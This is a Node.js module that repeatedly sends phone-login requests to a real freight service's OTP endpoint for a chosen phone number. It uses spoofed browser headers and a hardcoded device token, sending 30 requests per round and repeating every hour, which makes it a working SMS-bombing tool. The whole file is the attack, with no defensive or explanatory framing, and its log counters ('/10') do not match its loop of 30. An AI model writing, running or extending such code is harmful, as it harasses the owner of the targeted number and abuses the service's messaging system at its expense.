const axios = require("axios");

async function trucklagbe(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 30; i++) {
      try {
        const response = await axios.post(
        'https://tethys.trucklagbe.com/tl_gateway/tl_login/124/loginWithPhoneNo',
        {
          'userType': 'shipper',
          'phoneNo': number
        },
        {
          headers: {
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Origin': 'https://trucklagbe.com',
            'Referer': 'https://trucklagbe.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'deviceId': '103.102.136.621750754434094',
            'lat': '0',
            'lng': '0',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'source': 'website',
            'ut': '7TCEAKQLeGXk87hW664ok7rbv8t2qq4rl2dexBFDkhzW2GTG7fQ7s1FZ2AD3AhkzTpbA2BP66/1Ep+TxALjFlYJYMspCRscV5c/rd/cfVtp16TfkWmW4VubQXhihWJNtu7iauG1jHRW/fV4LIIo8PEKI4HcQqL/OIsrWypowzB9JsWalUdPIxfZaDvPexhNw'
          }
        }
      );
        
        console.log(`[${i + 1}/10] Trucklagbe Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] Trucklaghbe Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 1 hours before next round...`);
      await new Promise(resolve => setTimeout(resolve, 3600000));
    }
  }

  console.log("✅ All rounds completed.");
}

module.exports = { trucklagbe };
